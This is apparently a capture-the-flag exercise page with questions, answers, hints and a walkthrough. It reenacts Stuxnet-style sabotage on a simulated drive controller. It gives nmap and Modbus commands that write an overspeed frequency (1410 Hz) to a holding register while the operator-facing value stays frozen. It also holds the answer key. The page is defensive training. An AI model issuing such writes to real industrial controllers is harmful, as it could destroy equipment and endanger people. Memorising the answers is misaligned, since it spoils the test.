---
title: Overspeed the rotor, keep the view clean
questions:
  - ref: safe-band
    prompt: >-
      Read cascade.txt and fingerprint the drive controller. What is the top of
      the rotor's safe operating band, in Hz? (the number the notes give)
    kind: numeric
    value: 1200
    points: 10
    hints:
      - body: "type cascade.txt - it states the nominal speed and the safe band."
        cost: 3
    explain: >-
      Nominal is 1064 Hz and the safe band is 1000-1200 Hz. Anything sustained
      outside that band stresses the rotor. The real Stuxnet pushed toward 1410 Hz.
  - ref: which-reg
    prompt: >-
      Which holding register do you write to command the drive frequency?
      (decimal)
    kind: numeric
    value: 10
    points: 10
    explain: >-
      Holding[10] is the commanded frequency. Holding[11] is the value reported to
      WinCC (frozen by the installed logic), and input[2] is the true rotor speed.
      The gap between input[2] and holding[11] is the whole trick.
  - ref: sabotage
    prompt: >-
      Command an overspeed that drives the true rotor outside the safe band and
      hold it there. When the rotor fails while WinCC still shows a normal speed,
      the controller latches the objective flag into holding[40..55]. Submit it.
    kind: dynamic
    flag_prefix: OTF
    points: 35
    hints:
      - body: "modbus write s7-417.cascade holding 10 1410  (then watch input[2] climb with 'status' or 'modbus read s7-417.cascade input 2 1')."
        cost: 8
      - body: >-
          The reported value in holding[11] stays at 1064 on its own (the malware
          freezes it), so you do not need to touch it. Just hold the overspeed for
          a few seconds, then read holding[40..55].
        cost: 12
    explain: >-
      You reproduced Stuxnet's signature: the rotor is being destroyed at 1400+
      Hz while every operator screen reads a calm 1064 Hz. The damage is real
      (input[2]); the view is a lie (holding[11]). That divergence, sustained and
      hidden, is what made Stuxnet so hard to catch and so effective. Your flag is
      unique to your session.
---

Now perform the last step yourself on the simulated drive controller.

## Read before you write

```
type cascade.txt
nmap -p502 --script modbus-discover s7-417.cascade
modbus read s7-417.cascade input 2 1
modbus read s7-417.cascade holding 10 2
```

You will see three related numbers: the commanded frequency (holding[10]), the
reported frequency (holding[11], what WinCC shows), and the true rotor
(input[2]). Under normal operation they agree. The installed logic has frozen the
reported value, so it will keep reading 1064 no matter what the rotor actually
does.

## Drive it out of band

```
modbus write s7-417.cascade holding 10 1410
```

Then watch the truth diverge from the view:

```
status
modbus read s7-417.cascade input 2 1     (the real rotor, climbing)
modbus read s7-417.cascade holding 11 1   (the operator's view, still 1064)
```

Hold the overspeed for a few seconds. When the rotor fails while the view still
reads normal, the controller latches your flag into holding[40..55]. Read it and
submit it.

> Everything here is simulated. The purpose is to feel, concretely, how a
> physical process can be destroyed while every human indicator says it is fine,
> so that you build detections that compare independent sources of truth rather
> than trusting the reported value.
